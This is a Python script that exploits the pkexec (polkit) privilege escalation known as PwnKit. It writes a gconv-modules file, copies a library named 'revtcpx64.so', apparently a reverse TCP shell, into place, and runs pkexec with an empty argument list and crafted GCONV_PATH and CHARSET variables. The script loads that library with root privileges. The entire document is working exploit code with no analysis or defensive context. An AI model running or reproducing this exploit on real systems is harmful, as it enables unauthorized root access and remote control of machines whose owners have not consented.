import subprocess
import sys
import os
import shutil
from ctypes import cdll, c_char_p, POINTER

libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)


#command = "mkdir -p GCONV_PATH=.".split()
#subprocess.run(command)
#command = "touch GCONV_PATH=./pwnkit".split()
#subprocess.run(command)
#command =  "chmod a+x GCONV_PATH=./pwnkit".split()
#subprocess.run(command)
#command = "mkdir -p pwnkit".split()
#subprocess.run(command)
file = open("pwnkit/gconv-modules", 'w')
file.write("module UTF-8// PWNKIT// pwnkit 2")
file.close()
shutil.copyfile('revtcpx64.so', 'pwnkit/pwnkit.so')
argv = [None]
cmd = b'/usr/bin/pkexec'
env = [b"pwnkit", b"PATH=GCONV_PATH=.", b"CHARSET=PWNKIT", b"SHELL=pwnkit", None]

cargv = (c_char_p * len(argv))(*argv)
cenvp = (c_char_p * len(env))(*env)

libc.execve(cmd, cargv, cenvp)

